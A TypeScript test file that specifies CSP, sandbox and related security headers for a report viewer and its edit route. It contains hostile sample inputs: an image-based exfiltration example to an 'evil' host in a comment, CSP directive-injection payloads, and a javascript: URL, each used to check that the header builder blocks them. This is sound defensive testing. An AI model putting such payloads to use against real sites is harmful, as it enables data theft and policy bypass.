// SPECIFICATION tests for the viewer origin's security headers (ADR-013),
// plus the second, edit-route-only CSP profile added by ADR-0063 Phase 3
// (`editViewHeaders`). These pin the CURRENT header values exactly; a failing
// test here means a header changed, which is a decision to make deliberately,
// not a surprise. SECURITY-SENSITIVE — assertions written before the
// `editViewHeaders` implementation (TDD).
//
// PROMOTED from characterization to specification (ADR-0062 Amendment 3): the
// sandbox CSP's four granted tokens were written in a single commit (c04de5c,
// 2026-06-02) with no itemised rationale and were never revisited, so the only
// thing pinning them was one exact-string assertion — which says WHAT the
// value is but never WHY, and says nothing at all about what is withheld. The
// `sandbox CSP token grants` block below names each granted token with the
// capability it buys, and asserts the withheld ones NEGATIVELY, so widening
// the sandbox becomes an explicit, reviewable act rather than an invisible
// string edit.
//
// This mattered concretely: the "links don't work in reports" investigation
// first suspected these tokens. A real-browser reproduction under the
// byte-identical production sandbox CSP proved otherwise — fragment
// navigation, self-navigation and `target="_blank"` all work under it (see
// ADR-0062 Amendment 3) — so NOTHING here was widened for that fix. The
// negative assertions are what keep the next investigation from "fixing" it
// the wrong way.
import { describe, expect, it } from "vitest";
import { editViewHeaders, VIEW_CSP_ALLOWLIST, viewHeaders } from "./view-headers";

// ADR-0088 (amends ADR-013): the enforcing view CSP is built from the ONE
// exported `Viewer CSP allowlist` constant, and these tests assert against
// that constant rather than restating its hosts — a duplicated string here
// would let the constant and its "specification" drift apart in the same
// commit, which is precisely what a named allowlist exists to prevent.
const allow = (hosts: readonly string[]): string => hosts.join(" ");

const ENFORCING_CSP = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)}`,
  `style-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.styleSrc)}`,
  "img-src 'self' data: blob:",
  `font-src 'self' data: ${allow(VIEW_CSP_ALLOWLIST.fontSrc)}`,
  "connect-src 'self'",
  "frame-ancestors 'self'",
  "base-uri 'none'",
  "form-action 'self'",
  "object-src 'none'",
  "worker-src 'self'",
  "report-to csp-endpoint",
].join("; ");

const SANDBOX_CSP = "sandbox allow-forms allow-scripts allow-popups allow-popups-to-escape-sandbox";

const REPORT_ONLY_CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'self'",
  "object-src 'none'",
  "worker-src 'self'",
  "report-to csp-endpoint",
].join("; ");

describe("viewHeaders", () => {
  it("appends the enforcing CSP + the sandbox CSP as two Content-Security-Policy values", () => {
    const h = viewHeaders();
    // Headers.append() + .get() joins multiple values with ", " (WHATWG Fetch).
    expect(h.get("Content-Security-Policy")).toBe(`${ENFORCING_CSP}, ${SANDBOX_CSP}`);
  });

  it("pins the report-only CSP (stricter: no 'unsafe-inline' on script/style)", () => {
    expect(viewHeaders().get("Content-Security-Policy-Report-Only")).toBe(REPORT_ONLY_CSP);
  });

  // ADR-0088: the artifact-parity allowlist. A report published here should
  // render the way the artifact it was generated as renders — the designed
  // typeface, the charting library — and these four hosts are what that costs.
  describe("Viewer CSP allowlist (ADR-0088) — artifact parity, bought at four named hosts", () => {
    const enforcing = () =>
      (viewHeaders().get("Content-Security-Policy") ?? "").split(", ")[0] ?? "";

    it("is ONE exported constant, keyed by the directive each host belongs to", () => {
      // The shape is the contract: adding a host is an edit to this object,
      // visible in a diff, and reviewable as the security decision it is.
      expect(Object.keys(VIEW_CSP_ALLOWLIST).sort()).toEqual(["fontSrc", "scriptSrc", "styleSrc"]);
    });

    it("allows the Google Fonts stylesheet host on style-src — and nothing else new there", () => {
      expect(VIEW_CSP_ALLOWLIST.styleSrc).toEqual(["https://fonts.googleapis.com"]);
      expect(enforcing()).toContain(
        `style-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.styleSrc)};`,
      );
    });

    it("allows the Google Fonts file host on font-src — the typeface itself", () => {
      // Two hosts, not one: googleapis serves the @font-face CSS, gstatic
      // serves the woff2 it points at. Allowing either alone renders nothing.
      expect(VIEW_CSP_ALLOWLIST.fontSrc).toEqual(["https://fonts.gstatic.com"]);
      expect(enforcing()).toContain(`font-src 'self' data: ${allow(VIEW_CSP_ALLOWLIST.fontSrc)};`);
    });

    it("allows exactly the two pinned script CDNs on script-src — a third is a decision", () => {
      expect(VIEW_CSP_ALLOWLIST.scriptSrc).toEqual([
        "https://cdnjs.cloudflare.com",
        "https://cdn.jsdelivr.net/npm/",
      ]);
      expect(enforcing()).toContain(
        `script-src 'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)};`,
      );
    });

    it("carries no wildcard, no bare scheme, and no plaintext host", () => {
      // A `https:`, `*` or `data:` entry would turn a named allowlist back
      // into an open door while still looking like a list.
      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
        expect(host.startsWith("https://")).toBe(true);
        expect(host).not.toContain("*");
        expect(host.length).toBeGreaterThan("https://".length);
      }
    });

    it("SECURITY: leaves every OUTBOUND directive pinned — the allowlist loads, it never sends", () => {
      // This is the whole safety argument of ADR-0088. `connect-src 'self'`
      // is what keeps exfiltration blocked (spec threat #3); `img-src` stays
      // pinned because a wildcard image source IS an exfil channel
      // (`new Image().src = "https://evil/?" + secret`) that defeats
      // connect-src without ever using connect.
      const csp = enforcing();
      expect(csp).toContain("connect-src 'self';");
      expect(csp).toContain("img-src 'self' data: blob:;");
      expect(csp).toContain("form-action 'self';");
      expect(csp).toContain("worker-src 'self';");
      expect(csp).toContain("object-src 'none';");
      expect(csp).toContain("base-uri 'none';");
      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
        expect(csp).not.toContain(`connect-src 'self' ${host}`);
        expect(csp).not.toContain(`img-src 'self' data: blob: ${host}`);
      }
    });

    it("frames only under its own origin — frame-ancestors 'self', never 'none', never a wildcard", () => {
      // 'self' lets the viewer origin build report-in-a-frame surfaces of its
      // own; app.<domain> is a DIFFERENT origin and an attacker's page is not
      // 'self', so clickjacking a report stays impossible.
      const csp = enforcing();
      expect(csp).toContain("frame-ancestors 'self';");
      expect(csp).not.toContain("frame-ancestors 'none'");
      expect(csp).not.toContain("frame-ancestors *");
    });

    it("does NOT leak the allowlist into the report-only shadow policy — it stays strict", () => {
      // The shadow policy is the instrument that tells us what reports reach
      // for. Widening it too would blind us at the moment we most want to see.
      const reportOnly = viewHeaders().get("Content-Security-Policy-Report-Only") ?? "";
      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
        expect(reportOnly).not.toContain(host);
      }
      expect(reportOnly).toContain("frame-ancestors 'none'");
    });

    it("does NOT leak the allowlist into the edit-route profile (ADR-0063, out of scope)", () => {
      const editCsp =
        editViewHeaders({ appOrigin: "https://app.example.com" }).get("Content-Security-Policy") ??
        "";
      for (const host of Object.values(VIEW_CSP_ALLOWLIST).flat()) {
        expect(editCsp).not.toContain(host);
      }
      expect(editCsp).toContain("frame-ancestors 'none'");
    });
  });

  describe("sandbox CSP token grants — each token named for what it buys", () => {
    const sandbox = () =>
      (viewHeaders().get("Content-Security-Policy") ?? "")
        .split(", ")
        .find((value) => value.startsWith("sandbox")) ?? "";

    it("grants allow-scripts — reports are self-contained documents whose own JS must run", () => {
      expect(sandbox()).toContain("allow-scripts");
    });

    it("grants allow-forms — a report may carry a form (e.g. a survey link submit)", () => {
      expect(sandbox()).toContain("allow-forms");
    });

    it("grants allow-popups — this is what lets target=_blank open a new tab at all", () => {
      // ADR-0062 Amendment 3's "author-decides" new-tab behavior depends on
      // this token: the schema retains `target="_blank"`, and the browser can
      // only honor it because the sandboxed viewer document may open popups.
      expect(sandbox()).toContain("allow-popups");
    });

    it("grants allow-popups-to-escape-sandbox — the opened tab is a normal page, not a sandboxed one", () => {
      // Without it, a link to a third-party site opens INSIDE this sandbox:
      // the destination would silently lose scripts/forms/its own origin and
      // appear broken, and users would blame the report.
      expect(sandbox()).toContain("allow-popups-to-escape-sandbox");
    });

    it("WITHHOLDS allow-same-origin — the opaque origin is the whole isolation model", () => {
      // Granting it would give untrusted report JS the viewer origin's
      // storage/cookies/DOM — it would undo ADR-002/ADR-013 entirely. This is
      // the single most important negative assertion in this file.
      expect(sandbox()).not.toContain("allow-same-origin");
    });

    it("WITHHOLDS allow-top-navigation and its user-activation variant", () => {
      // A report must never be able to navigate the tab it is served in to an
      // attacker's page. Self-navigation (a link to another page of the same
      // report) is EXEMPT from the sandbox navigation check by spec, so this
      // token buys nothing legitimate — verified in a real browser during the
      // ADR-0062 Amendment 3 investigation, which is why the "links don't
      // work" fix did NOT widen the sandbox.
      expect(sandbox()).not.toContain("allow-top-navigation");
      expect(sandbox()).not.toContain("allow-top-navigation-by-user-activation");
      expect(sandbox()).not.toContain("allow-top-navigation-to-custom-protocols");
    });

    it("WITHHOLDS allow-downloads — a linked third-party payload is never scanned", () => {
      // ADR-012's scan gate covers what is UPLOADED, not what a report links
      // to. Accepted, documented product limitation (ADR-0062 Amendment 3).
      expect(sandbox()).not.toContain("allow-downloads");
    });

    it("WITHHOLDS allow-modals, allow-pointer-lock, allow-presentation, allow-orientation-lock", () => {
      // UI-hijacking / attention-capture primitives with no report use case.
      for (const token of [
        "allow-modals",
        "allow-pointer-lock",
        "allow-presentation",
        "allow-orientation-lock",
      ]) {
        expect(sandbox()).not.toContain(token);
      }
    });

    it("grants EXACTLY four tokens — a fifth is a decision, not a diff", () => {
      expect(sandbox().split(/\s+/).slice(1).sort()).toEqual([
        "allow-forms",
        "allow-popups",
        "allow-popups-to-escape-sandbox",
        "allow-scripts",
      ]);
    });
  });

  it("pins COOP same-origin, CORP same-site, and Origin-Agent-Cluster", () => {
    const h = viewHeaders();
    expect(h.get("Cross-Origin-Opener-Policy")).toBe("same-origin");
    expect(h.get("Cross-Origin-Resource-Policy")).toBe("same-site");
    expect(h.get("Origin-Agent-Cluster")).toBe("?1");
  });

  it("pins Referrer-Policy, Permissions-Policy, X-Content-Type-Options, HSTS", () => {
    const h = viewHeaders();
    expect(h.get("Referrer-Policy")).toBe("no-referrer");
    expect(h.get("Permissions-Policy")).toBe(
      "camera=(), microphone=(), geolocation=(), usb=(), payment=(), accelerometer=(), " +
        "gyroscope=(), magnetometer=(), midi=(), serial=(), bluetooth=(), interest-cohort=()",
    );
    expect(h.get("X-Content-Type-Options")).toBe("nosniff");
    expect(h.get("Strict-Transport-Security")).toBe("max-age=63072000; includeSubDomains; preload");
  });

  it("pins the default Cache-Control (private, short-lived, revalidated)", () => {
    expect(viewHeaders().get("Cache-Control")).toBe("private, max-age=60, must-revalidate");
  });

  it("lets a caller override Cache-Control per-response (e.g. /health → no-store)", () => {
    const h = viewHeaders();
    h.set("Cache-Control", "no-store");
    expect(h.get("Cache-Control")).toBe("no-store");
  });

  it("defaults the Report-To endpoint to the localhost dev fallback when unconfigured", () => {
    const h = viewHeaders({ reportToUrl: undefined });
    const reportTo = JSON.parse(h.get("Report-To") ?? "{}");
    expect(reportTo.group).toBe("csp-endpoint");
    expect(reportTo.max_age).toBe(10886400);
    expect(reportTo.endpoints[0].url.endsWith("/csp-report")).toBe(true);
  });

  it("threads an explicit reportToUrl straight into the Report-To header", () => {
    const h = viewHeaders({ reportToUrl: "https://view.example.com/csp-report" });
    const reportTo = JSON.parse(h.get("Report-To") ?? "{}");
    expect(reportTo.endpoints).toEqual([{ url: "https://view.example.com/csp-report" }]);
  });
});

// ADR-0063 Phase 3 (Decisions 1-2): the authenticated `/edit` route's CSP
// profile. The top-level document there is the TRUSTED first-party editor
// app (not the untrusted report), so it must NOT be sandboxed — the
// untrusted report is isolated inside the editor's own sandboxed `srcDoc`
// iframe instead (its own restrictive `<meta>` CSP, apps/app/app/editor/
// iframe-document.ts). No route wires this profile yet (Phase 4) — these
// tests exercise the pure header builder in isolation.
const APP_ORIGIN = "https://app.example.com";

const EDIT_ENFORCING_CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  `connect-src 'self' ${APP_ORIGIN}`,
  "frame-src 'self'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'self'",
  "object-src 'none'",
  "worker-src 'self'",
  "report-to csp-endpoint",
].join("; ");

const EDIT_REPORT_ONLY_CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  `connect-src 'self' ${APP_ORIGIN}`,
  "frame-src 'self'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'self'",
  "object-src 'none'",
  "worker-src 'self'",
  "report-to csp-endpoint",
].join("; ");

describe("editViewHeaders", () => {
  it("pins a single enforcing CSP — no separate sandbox CSP header", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    expect(h.get("Content-Security-Policy")).toBe(EDIT_ENFORCING_CSP);
    // Two Content-Security-Policy values would be joined with ", " by
    // Headers.get() (WHATWG Fetch) — assert there's exactly one.
    expect(h.get("Content-Security-Policy")).not.toContain(", ");
    expect(h.get("Content-Security-Policy")).not.toContain("sandbox");
  });

  it("pins the report-only shadow CSP (stricter: no 'unsafe-inline' on style-src)", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    expect(h.get("Content-Security-Policy-Report-Only")).toBe(EDIT_REPORT_ONLY_CSP);
  });

  it("widens connect-src to 'self' plus the exact app origin — never '*'", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    const csp = h.get("Content-Security-Policy") ?? "";
    expect(csp).toContain(`connect-src 'self' ${APP_ORIGIN}`);
    expect(csp).not.toContain("connect-src *");
    expect(csp).not.toContain("connect-src 'self' *");
  });

  it("normalizes a trailing slash off the passed appOrigin", () => {
    const h = editViewHeaders({ appOrigin: `${APP_ORIGIN}/` });
    expect(h.get("Content-Security-Policy")).toContain(`connect-src 'self' ${APP_ORIGIN};`);
  });

  it("SECURITY: cannot inject a CSP directive via appOrigin (claude-review #181)", () => {
    // The guarantee is outcome-based: a crafted appOrigin can NEVER add a
    // directive to the CSP — either the URL is invalid (throws, rejected) or its
    // path/query/fragment payload is stripped by `new URL().origin`. Assert the
    // property regardless of which path a given payload takes.
    const cspFor = (appOrigin: string): string => {
      try {
        return editViewHeaders({ appOrigin }).get("Content-Security-Policy") ?? "";
      } catch {
        return ""; // rejected outright — also safe
      }
    };
    for (const payload of [
      "https://evil.com; default-src *",
      "https://app.centaurspec.com/evil?a;b#c; default-src *",
      "https://app.centaurspec.com/ x script-src *",
    ]) {
      const csp = cspFor(payload);
      expect(csp).not.toContain("default-src *");
      expect(csp).not.toContain("script-src *");
      expect(csp).not.toContain("evil");
    }
    // A parseable junk-in-path origin is reduced to its clean origin token:
    const h = editViewHeaders({ appOrigin: "https://app.centaurspec.com/x?a=1#f" });
    expect(h.get("Content-Security-Policy")).toContain(
      "connect-src 'self' https://app.centaurspec.com;",
    );
  });

  it("SECURITY: rejects non-http(s) schemes, embedded credentials, and non-local http", () => {
    expect(() => editViewHeaders({ appOrigin: "javascript:alert(1)" })).toThrow();
    expect(() => editViewHeaders({ appOrigin: "data:text/html,x" })).toThrow();
    expect(() => editViewHeaders({ appOrigin: "https://user:pass@app.centaurspec.com" })).toThrow();
    expect(() => editViewHeaders({ appOrigin: "http://app.centaurspec.com" })).toThrow(); // prod must be https
    expect(() => editViewHeaders({ appOrigin: "not a url" })).toThrow();
    // http IS allowed for localhost dev:
    expect(() => editViewHeaders({ appOrigin: "http://localhost:3000" })).not.toThrow();
  });

  it("scopes script-src to 'self' only — first-party editor bundle, no 'unsafe-inline'", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    expect(h.get("Content-Security-Policy")).toContain("script-src 'self';");
  });

  it("allows a same-origin srcdoc iframe for the report editor (frame-src 'self')", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    expect(h.get("Content-Security-Policy")).toContain("frame-src 'self';");
  });

  it("keeps frame-ancestors, base-uri, and object-src as strict as the public profile", () => {
    const csp = editViewHeaders({ appOrigin: APP_ORIGIN }).get("Content-Security-Policy") ?? "";
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("object-src 'none'");
  });

  it("pins COOP same-origin, CORP same-site, and Origin-Agent-Cluster (same as the public profile)", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    expect(h.get("Cross-Origin-Opener-Policy")).toBe("same-origin");
    expect(h.get("Cross-Origin-Resource-Policy")).toBe("same-site");
    expect(h.get("Origin-Agent-Cluster")).toBe("?1");
  });

  it("pins Referrer-Policy, Permissions-Policy, X-Content-Type-Options, HSTS", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN });
    expect(h.get("Referrer-Policy")).toBe("no-referrer");
    expect(h.get("Permissions-Policy")).toBe(
      "camera=(), microphone=(), geolocation=(), usb=(), payment=(), accelerometer=(), " +
        "gyroscope=(), magnetometer=(), midi=(), serial=(), bluetooth=(), interest-cohort=()",
    );
    expect(h.get("X-Content-Type-Options")).toBe("nosniff");
    expect(h.get("Strict-Transport-Security")).toBe("max-age=63072000; includeSubDomains; preload");
  });

  it("sets Cache-Control: no-store — the edit route is authenticated + per-user", () => {
    expect(editViewHeaders({ appOrigin: APP_ORIGIN }).get("Cache-Control")).toBe("no-store");
  });

  it("defaults the Report-To endpoint the same way as the public profile", () => {
    const h = editViewHeaders({ appOrigin: APP_ORIGIN, reportToUrl: undefined });
    const reportTo = JSON.parse(h.get("Report-To") ?? "{}");
    expect(reportTo.group).toBe("csp-endpoint");
    expect(reportTo.endpoints[0].url.endsWith("/csp-report")).toBe(true);
  });

  it("threads an explicit reportToUrl straight into the Report-To header", () => {
    const h = editViewHeaders({
      appOrigin: APP_ORIGIN,
      reportToUrl: "https://view.example.com/csp-report",
    });
    const reportTo = JSON.parse(h.get("Report-To") ?? "{}");
    expect(reportTo.endpoints).toEqual([{ url: "https://view.example.com/csp-report" }]);
  });
});

describe("editViewHeaders vs viewHeaders — the two profiles differ only in the intended ways", () => {
  function directiveMap(csp: string): Record<string, string> {
    return Object.fromEntries(
      csp.split("; ").map((directive) => {
        const [name, ...rest] = directive.split(" ");
        return [name, rest.join(" ")];
      }),
    );
  }

  it("the public profile carries a sandbox CSP header value; the edit profile does not", () => {
    const publicCsp = viewHeaders().get("Content-Security-Policy") ?? "";
    const editCsp = editViewHeaders({ appOrigin: APP_ORIGIN }).get("Content-Security-Policy") ?? "";
    expect(publicCsp).toContain("sandbox allow-forms");
    expect(editCsp).not.toContain("sandbox");
  });

  it("the enforcing directive sets differ ONLY in the intended directives", () => {
    // Intended differences: script-src / style-src / font-src (ADR-0088's
    // allowlist is public-profile-only), connect-src (the edit profile's app
    // origin), frame-ancestors (ADR-0088 relaxes the PUBLIC profile to 'self';
    // the edit route stays 'none'), and frame-src (new in the edit profile).
    // The public CSP header carries two appended values (enforcing + sandbox);
    // only the first (enforcing) is the comparable profile.
    const publicEnforcing =
      (viewHeaders().get("Content-Security-Policy") ?? "").split(", ")[0] ?? "";
    const editEnforcing =
      editViewHeaders({ appOrigin: APP_ORIGIN }).get("Content-Security-Policy") ?? "";

    const publicDirectives = directiveMap(publicEnforcing);
    const editDirectives = directiveMap(editEnforcing);

    // frame-src is new in the edit profile (the public profile never embeds
    // a nested iframe, so it has no frame-src directive at all).
    expect(publicDirectives["frame-src"]).toBeUndefined();
    expect(editDirectives["frame-src"]).toBe("'self'");

    const editWithoutFrameSrc = { ...editDirectives };
    delete editWithoutFrameSrc["frame-src"];

    const intentionallyDifferent = new Set([
      "script-src",
      "style-src",
      "font-src",
      "connect-src",
      "frame-ancestors",
    ]);
    for (const key of Object.keys(publicDirectives)) {
      if (intentionallyDifferent.has(key)) continue;
      expect(editWithoutFrameSrc[key]).toBe(publicDirectives[key]);
    }

    // script-src: the edit profile is STRICTER — it drops BOTH 'unsafe-inline'
    // and the ADR-0088 allowlist. Never looser than the public profile.
    expect(publicDirectives["script-src"]).toBe(
      `'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)}`,
    );
    expect(editDirectives["script-src"]).toBe("'self'");

    // style-src / font-src: the allowlist is the public profile's alone —
    // the edit route renders the first-party editor, not a report.
    expect(publicDirectives["style-src"]).toBe(
      `'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.styleSrc)}`,
    );
    expect(editDirectives["style-src"]).toBe("'self' 'unsafe-inline'");
    expect(publicDirectives["font-src"]).toBe(`'self' data: ${allow(VIEW_CSP_ALLOWLIST.fontSrc)}`);
    expect(editDirectives["font-src"]).toBe("'self' data:");

    // frame-ancestors: relaxed to 'self' on the public profile only.
    expect(publicDirectives["frame-ancestors"]).toBe("'self'");
    expect(editDirectives["frame-ancestors"]).toBe("'none'");

    // connect-src: the edit profile is WIDENED to the app origin, but only
    // by that one explicit origin — never a wildcard.
    expect(publicDirectives["connect-src"]).toBe("'self'");
    expect(editDirectives["connect-src"]).toBe(`'self' ${APP_ORIGIN}`);
  });
});
